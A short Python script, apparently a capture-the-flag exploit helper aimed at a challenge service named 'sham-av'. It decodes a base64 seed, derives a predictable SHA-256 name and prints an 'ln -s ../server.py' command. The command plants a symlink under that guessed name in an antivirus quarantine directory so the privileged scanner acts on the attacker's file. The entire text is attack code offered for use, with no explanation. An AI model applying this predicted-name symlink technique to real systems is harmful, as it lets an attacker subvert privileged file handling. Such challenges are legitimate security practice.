import base64, socket, os, hashlib, shutil, sys

ctr=1
CTR_LENGTH = 256
seed = base64.b64decode("WSudp1zsdH8FsjqTjugy8t2yPjyFSX/3+aVO3T0XJTY=") # INSERT here

def genrandom():
    global ctr
    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder='little') + seed).hexdigest()
    return result
print(f'ln -s ../server.py /home/antivirus/quarantine/sham-av-{genrandom()}')